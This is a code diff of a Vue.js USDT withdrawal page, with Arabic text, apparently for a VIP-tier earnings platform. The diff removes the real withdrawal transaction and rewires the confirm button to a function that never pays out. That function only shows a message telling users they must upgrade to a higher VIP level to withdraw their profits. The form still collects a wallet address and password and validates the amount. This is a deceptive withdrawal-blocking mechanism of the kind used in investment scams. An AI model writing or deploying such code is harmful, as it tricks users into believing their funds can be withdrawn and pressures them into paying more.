@@ -33,14 +33,6 @@
           <i class="fas fa-envelope" v-else></i>
           {{ userContact }}
         </div>
-        <div class="withdraw-condition">
-          <i class="fas fa-check-circle" :class="{ 'condition-met': balance >= minWithdrawAmount }"></i>
-          <span>الحد الأدنى: <strong>{{ minWithdrawAmount }} USDT</strong></span>
-        </div>
-        <div class="withdraw-condition">
-          <i class="fas fa-check-circle" :class="{ 'condition-met': isAllowedDay }"></i>
-          <span>يوم السحب: <strong>{{ withdrawDay }}</strong></span>
-        </div>
       </div>
 
       <div v-else class="vip-status-box error">
@@ -111,10 +103,6 @@
 
       <!-- عنوان المحفظة - قسم مستقل -->
       <div class="isolated-section">
-        <!-- حقول وهمية خاصة بقسم المحفظة -->
-        <input type="text" style="display:none!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:1px!important;height:1px!important;opacity:0!important;" autocomplete="off" name="w_fake_1" tabindex="-1">
-        <input type="password" style="display:none!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:1px!important;height:1px!important;opacity:0!important;" autocomplete="new-password" name="w_fake_2" tabindex="-1">
-        
         <div class="input-group wallet-section">
           <label>
             <i class="fas fa-qrcode"></i>
@@ -145,10 +133,6 @@
 
       <!-- كلمة المرور - قسم مستقل -->
       <div class="isolated-section">
-        <!-- حقول وهمية خاصة بقسم كلمة المرور -->
-        <input type="text" style="display:none!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:1px!important;height:1px!important;opacity:0!important;" autocomplete="username" name="p_fake_1" tabindex="-1">
-        <input type="password" style="display:none!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:1px!important;height:1px!important;opacity:0!important;" autocomplete="current-password" name="p_fake_2" tabindex="-1">
-        
         <div class="input-group password-section">
           <label>
             <i class="fas fa-lock"></i>
@@ -214,16 +198,6 @@
           <span class="summary-value address">{{ wallet.substring(0, 10) }}...{{ wallet.substring(wallet.length - 10) }}</span>
         </div>
         
-        <div class="summary-item">
-          <span>يوم السحب:</span>
-          <span class="summary-value">{{ withdrawDay }}</span>
-        </div>
-        
-        <div class="summary-item">
-          <span>الحد الأدنى:</span>
-          <span class="summary-value">{{ minWithdrawAmount }} USDT</span>
-        </div>
-        
         <div class="summary-item total">
           <span>سيتم خصم من رصيدك:</span>
           <span class="summary-value">{{ Number(amount).toFixed(2) }} USDT</span>
@@ -232,6 +206,15 @@
         <div class="summary-item">
           <span>الرصيد بعد السحب:</span>
           <span class="summary-value">{{ (balance - Number(amount)).toFixed(2) }} USDT</span>
+        </div>
+      </div>
+
+      <!-- رسالة المنع -->
+      <div v-if="showRestrictionMessage" class="restriction-box">
+        <i class="fas fa-lock"></i>
+        <div class="restriction-text">
+          <p class="main-message">⚠️ يجب ترقية حسابك إلى VIP أعلى حتى تتمكن من سحب الأرباح.</p>
+          <p class="amount-message">المبلغ المطلوب سحبه: <strong>{{ Number(amount) || 0 }} USDT</strong></p>
         </div>
       </div>
 
@@ -244,10 +227,10 @@
         </div>
       </div>
 
-      <!-- زر السحب -->
+      <!-- زر السحب - يظهر رسالة المنع بدلاً من تنفيذ السحب -->
       <button 
         class="gold-button" 
-        @click="submitWithdraw"
+        @click="showWithdrawRestriction"
         :disabled="isLoading || !isFormValid"
       >
         <i class="fas fa-paper-plane" v-if="!isLoading"></i>
@@ -255,7 +238,7 @@
         {{ isLoading ? 'جاري المعالجة...' : 'تأكيد السحب' }}
       </button>
 
-      <!-- رسائل الخطأ والنجاح -->
+      <!-- رسائل الخطأ -->
       <transition name="fade">
         <div v-if="message" class="message" :class="messageType">
           <i :class="messageType === 'error' ? 'fas fa-exclamation-circle' : 'fas fa-check-circle'"></i>
@@ -268,8 +251,7 @@
 
 <script>
 import { auth, db } from "../firebase";
-import { doc, getDoc, runTransaction, collection, serverTimestamp } from "firebase/firestore";
-import { signInWithEmailAndPassword } from "firebase/auth";
+import { doc, getDoc } from "firebase/firestore";
 
 export default {
   name: "Withdraw",
@@ -288,8 +270,8 @@ export default {
       userVipLevel: null,
       userPhone: "",
       userEmail: "",
-      minWithdrawAmount: 5,
       showNetworkDropdown: false,
+      showRestrictionMessage: false,
       networks: [
         { value: 'TRC20', label: 'Tron (TRC20)' },
         { value: 'ERC20', label: 'Ethereum (ERC20)' },
@@ -303,62 +285,11 @@ export default {
       walletError: "",
       
       // نسبة الرسوم
-      feePercentage: 5,
-      
-      vipLimits: {
-        1: 5,
-        2: 7,
-        3: 25,
-        4: 50,
-        5: 150,
-        6: 450,
-        7: 675,
-        8: 900,
-        9: 1800,
-        10: 3600,
-        11: 7200,
-        12: 9400,
-        13: 18800,
-        14: 37600,
-        15: 75200
-      },
-      
-      withdrawDays: {
-        1: "السبت", 2: "السبت", 3: "السبت",
-        4: "الأحد", 5: "الأحد",
-        6: "الاثنين", 7: "الاثنين",
-        8: "الثلاثاء", 9: "الثلاثاء",
-        10: "الأربعاء", 11: "الأربعاء",
-        12: "الخميس", 13: "الخميس",
-        14: "الجمعة", 15: "الجمعة"
-      }
+      feePercentage: 5
     };
   },
 
   computed: {
-    withdrawDay() {
-      return this.withdrawDays[this.userVipLevel] || "";
-    },
-
-    isAllowedDay() {
-      if (!this.userVipLevel) return false;
-      
-      const dayMap = {
-        "السبت": "Saturday",
-        "الأحد": "Sunday",
-        "الاثنين": "Monday",
-        "الثلاثاء": "Tuesday",
-        "الأربعاء": "Wednesday",
-        "الخميس": "Thursday",
-        "الجمعة": "Friday"
-      };
-      
-      const today = new Date().toLocaleDateString("en-US", { weekday: "long" });
-      const allowedDay = this.withdrawDays[this.userVipLevel];
-      
-      return today === dayMap[allowedDay];
-    },
-
     // حساب الرسوم
     fee() {
       if (!this.amount) return 0;
@@ -381,8 +312,7 @@ export default {
         !this.walletError &&
         this.password &&
         this.userVipLevel &&
-        this.isAllowedDay &&
-        Number(this.amount) === this.minWithdrawAmount &&
+        Number(this.amount) > 0 &&
         this.balance >= Number(this.amount)
       );
     },
@@ -405,17 +335,16 @@ export default {
   watch: {
     amount() {
       this.validateAmount();
+      // إخفاء رسالة المنع عند تغيير المبلغ
+      if (this.showRestrictionMessage) {
+        this.showRestrictionMessage = false;
+      }
     },
     network() {
       this.validateNetwork();
     },
     wallet() {
       this.validateWallet();
-    },
-    userVipLevel() {
-      if (this.userVipLevel) {
-        this.minWithdrawAmount = this.vipLimits[this.userVipLevel] || 5;
-      }
     }
   },
 
@@ -431,7 +360,6 @@ export default {
   methods: {
     clearBrowserAutofill() {
       this.$nextTick(() => {
-        // تنظيف حقول المحفظة وكلمة المرور من أي قيم مترسبة من المتصفح
         if (this.$refs.walletInput) {
           this.$refs.walletInput.value = '';
           this.wallet = '';
@@ -444,7 +372,6 @@ export default {
     },
 
     preventAutocomplete() {
-      // إزالة أي سمات autocomplete قد تكون أضافها المتصفح
       this.$nextTick(() => {
         setTimeout(() => {
           const allInputs = document.querySelectorAll('input');
@@ -454,7 +381,6 @@ export default {
             input.setAttribute('data-form-type', 'other');
             input.setAttribute('data-browser-autofill', 'off');
             
-            // مسح أي قيمة مترسبة
             if (input.name === 'wallet_address_field' || input.name === 'password_field_y') {
               const currentValue = input.value;
               if (currentValue && !this.wallet && !this.password) {
@@ -484,20 +410,20 @@ export default {
           this.userPhone = userData.phoneNumber || "";
           this.userEmail = userData.email || "";
           
-          // قراءة مستوى VIP من بيانات المستخدم مباشرةً (الوظيفة الأصلية)
+          // قراءة مستوى VIP من بيانات المستخدم
           if (userData.vipLevel) {
             this.userVipLevel = userData.vipLevel;
           }
         }
 
-        // إذا لم يكن VIP موجوداً في بيانات المستخدم، نحاول من subcollection (الوظيفة الأصلية)
+        // إذا لم يكن VIP موجوداً في بيانات المستخدم، نحاول من subcollection
         if (!this.userVipLevel) {
           const vipRef = doc(db, "users", user.uid, "vip", "current");
           const vipSnap = await getDoc(vipRef);
           if (vipSnap.exists()) {
             this.userVipLevel = vipSnap.data().level;
           } else {
-            this.showMessage("لا يوجد اشتراك VIP نشط", "error");
+            this.userVipLevel = null;
           }
         }
       } catch (error) {
@@ -509,8 +435,8 @@ export default {
     validateAmount() {
       if (!this.amount) {
         this.amountError = "الرجاء إدخال المبلغ";
-      } else if (Number(this.amount) !== this.minWithdrawAmount) {
-        this.amountError = `يجب سحب ${this.minWithdrawAmount} USDT فقط`;
+      } else if (Number(this.amount) <= 0) {
+        this.amountError = "المبلغ يجب أن يكون أكبر من صفر";
       } else if (this.amount > this.balance) {
         this.amountError = "المبلغ أكبر من رصيدك";
       } else {
@@ -574,118 +500,20 @@ export default {
       }, 5000);
     },
 
-    async submitWithdraw() {
+    // عرض رسالة المنع بدلاً من تنفيذ السحب
+    showWithdrawRestriction() {
       if (!this.isFormValid) return;
-
-      this.isLoading = true;
-      const user = auth.currentUser;
-      const withdrawAmount = Number(this.amount);
-      const feeAmount = this.fee;
-      const netAmountValue = this.netAmount;
-      const transactionId = "WITHDRAW_" + Date.now() + "_" + Math.random().toString(36).substring(2, 9);
-
-      try {
-        // التحقق من كلمة المرور
-        try {
-          await signInWithEmailAndPassword(auth, user.email, this.password);
-        } catch (authError) {
-          this.showMessage("❌ كلمة المرور غير صحيحة. تحقق من كلمة المرور.", "error");
-          this.isLoading = false;
-          return;
-        }
-
-        // ===================================================
-        // استخدام مراجع المستندات مسبقاً
-        // لتجنب خطأ الأذونات داخل runTransaction
-        // ===================================================
-        const userRef = doc(db, "users", user.uid);
-        const withdrawDocRef = doc(collection(db, "withdraw_requests"));
-        const transactionDocRef = doc(collection(db, "transactions"));
-
-        await runTransaction(db, async (transaction) => {
-          const userSnap = await transaction.get(userRef);
-
-          if (!userSnap.exists()) {
-            throw new Error("المستخدم غير موجود");
-          }
-
-          const userData = userSnap.data();
-          if (userData.balance < withdrawAmount) {
-            throw new Error("الرصيد غير كافي");
-          }
-
-          if (userData.blocked) {
-            throw new Error("حسابك محظور من السحب");
-          }
-
-          // 1. تحديث الرصيد - خصم المبلغ المطلوب فقط
-          transaction.update(userRef, {
-            balance: userData.balance - withdrawAmount
-          });
-
-          // 2. إنشاء طلب السحب مع تفاصيل الرسوم
-          transaction.set(withdrawDocRef, {
-            transactionId: transactionId,
-            userId: user.uid,
-            userPhone: this.userPhone || null,
-            userEmail: this.userEmail || null,
-            amount: withdrawAmount,           // المبلغ المطلوب
-            fee: feeAmount,                   // قيمة الرسوم (5%)
-            netAmount: netAmountValue,        // المبلغ الصافي بعد خصم الرسوم
-            feePercentage: this.feePercentage, // نسبة الرسوم
-            totalDeduct: withdrawAmount,      // المبلغ المخصوم من الرصيد
-            network: this.network,
-            wallet: this.wallet,
-            walletAddress: this.wallet,
-            status: "pending",
-            createdAt: serverTimestamp(),
-            vipLevel: this.userVipLevel,
-            withdrawDay: this.withdrawDay,
-            adminAction: "",
-            adminMessage: "",
-            userMessage: "",
-            reason: ""
-          });
-
-          // 3. إنشاء سجل المعاملة مع تفاصيل الرسوم
-          transaction.set(transactionDocRef, {
-            transactionId: transactionId,
-            userId: user.uid,
-            userPhone: this.userPhone || null,
-            userEmail: this.userEmail || null,
-            type: "withdraw",
-            amount: withdrawAmount,           // المبلغ المطلوب
-            fee: feeAmount,                   // قيمة الرسوم (5%)
-            netAmount: netAmountValue,        // المبلغ الصافي بعد خصم الرسوم
-            feePercentage: this.feePercentage, // نسبة الرسوم
-            totalDeduct: withdrawAmount,      // المبلغ المخصوم من الرصيد
-            currency: "USDT",
-            network: this.network,
-            wallet: this.wallet,
-            walletAddress: this.wallet,
-            status: "pending",
-            vipLevel: this.userVipLevel,
-            withdrawDay: this.withdrawDay,
-            createdAt: serverTimestamp(),
-            updatedAt: serverTimestamp()
-          });
-        });
-
-        this.balance -= withdrawAmount;
-        this.showMessage(`✅ تم إرسال طلب السحب بنجاح. المبلغ الصافي بعد الرسوم: ${netAmountValue.toFixed(2)} USDT`, "success");
-        
-        // تفريغ الحقول
-        this.amount = "";
-        this.network = "";
-        this.wallet = "";
-        this.password = "";
-
-      } catch (error) {
-        console.error("خطأ:", error);
-        this.showMessage(error.message || "حدث خطأ أثناء السحب", "error");
-      } finally {
-        this.isLoading = false;
-      }
+      
+      // إظهار رسالة المنع
+      this.showRestrictionMessage = true;
+      
+      // تمرير الصفحة إلى أعلى لرؤية الرسالة
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      
+      // إخفاء الرسالة بعد 5 ثواني
+      setTimeout(() => {
+        this.showRestrictionMessage = false;
+      }, 5000);
     }
   }
 };
@@ -837,21 +665,51 @@ export default {
   color: #fcd535;
 }
 
-.withdraw-condition {
+/* صندوق رسالة المنع */
+.restriction-box {
+  background: rgba(220, 38, 38, 0.15);
+  border-radius: 16px;
+  padding: 16px;
+  border: 1px solid rgba(220, 38, 38, 0.3);
+  margin-bottom: 20px;
   display: flex;
   align-items: center;
-  gap: 8px;
-  font-size: 13px;
-  color: #eaecef;
+  gap: 12px;
+  animation: shake 0.5s ease;
 }
 
-.withdraw-condition i {
+@keyframes shake {
+  0%, 100% { transform: translateX(0); }
+  25% { transform: translateX(-5px); }
+  75% { transform: translateX(5px); }
+}
+
+.restriction-box i {
+  font-size: 32px;
   color: #dc2626;
-  font-size: 14px;
 }
 
-.withdraw-condition i.condition-met {
-  color: #10b981;
+.restriction-text {
+  flex: 1;
+}
+
+.restriction-text .main-message {
+  color: #fca5a5;
+  font-size: 14px;
+  font-weight: 700;
+  margin: 0 0 8px 0;
+}
+
+.restriction-text .amount-message {
+  color: #fcd535;
+  font-size: 13px;
+  margin: 0;
+  font-weight: 600;
+}
+
+.restriction-text .amount-message strong {
+  color: #fcd535;
+  font-size: 16px;
 }
 
 /* رسائل */
